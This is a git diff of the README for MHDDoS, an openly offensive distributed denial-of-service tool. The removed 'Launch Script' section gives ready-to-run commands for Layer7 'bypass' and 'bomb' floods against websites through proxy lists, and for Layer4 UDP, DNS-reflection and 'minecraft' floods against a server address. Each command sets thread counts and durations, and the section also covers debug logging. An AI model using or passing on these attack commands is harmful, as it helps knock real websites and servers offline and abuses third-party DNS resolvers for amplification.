@@ -95,7 +95,6 @@ You can download it from [GitHub Releases](https://github.com/MHProDev/MHDDoS/re
 * [psutil](https://github.com/giampaolo/psutil)
 * [dnspython](https://github.com/rthalley/dnspython)
 * [yarl](https://github.com/aio-libs/yarl)
-* [bombardier](https://github.com/PXEiYyMH8F/bombardier/tree/78-add-proxy-support) (Optional, [installation](.github/BOMBARDIER.md))
 ---
 
 **Videos**
@@ -117,56 +116,6 @@ cd MHDDoS
 pip install -r requirements.txt
 ```
 
-
-## Launch Script
-* Proxy Types:
-
-| Proxy Type | Value |
-|------------|-------|
-| All Proxy  | 0     |
-| HTTP       | 1     |
-| SOCKS4     | 4     |
-| SOCKS5     | 5     |
-| RANDOM     | 6     |
-
-* Layer7 (Website):
-```shell script
-# Running bypass attack from 101 threads, 
-# with socks 5, 100 requests per proxy (connection), for 3600 seconds  
-python start.py bypass https://example.com 5 101 socks5.txt 100 3600
-# Running bomb attack from 50 threads (be careful must be < 300)
-# with all proxies (0), 100 requests per proxy (connection), for 3600 seconds
-python start.py bomb https://example.com 0 50 proxy.txt 100 3600
-```
-
-* Layer4 (Server/Home):
-```shell script
-# Running udp attack from 1 threads, for 3600 seconds  
-python start.py udp 1.1.1.1:53 1 3600
-# Running dns attack from 100 threads, for 3600 seconds  
-# with reflector servers from dns.txt, for 3600 seconds  
-python start.py dns 1.1.1.1:53 100 3600 dns.txt
-# Running dns attack from 1000 threads
-# with socks 5, for 3600 seconds  
-python start.py minecraft 1.1.1.1:53 1000 3600 5 socks5.txt
-```
-
-* Debug Mode (Log Attack status):
-```shell script
-python start.py bypass https://example.com 5 1000 socks5.txt 100 100 true
-python start.py udp 1.1.1.1:53 1 100 true
-python start.py dns 1.1.1.1:53 1 100 dns.txt true
-python start.py minecraft 1.1.1.1:53 1 100 5 socks5.txt true
-```
-
-* Tools/Help:
-```shell script
-python start.py tools
-python start.py help
-```
-
-[python3]: https://python.org 'Python3'
-[github]: https://github.com/MHProDev/MHDDoS/issues 'GitHub'
 
 ---
 
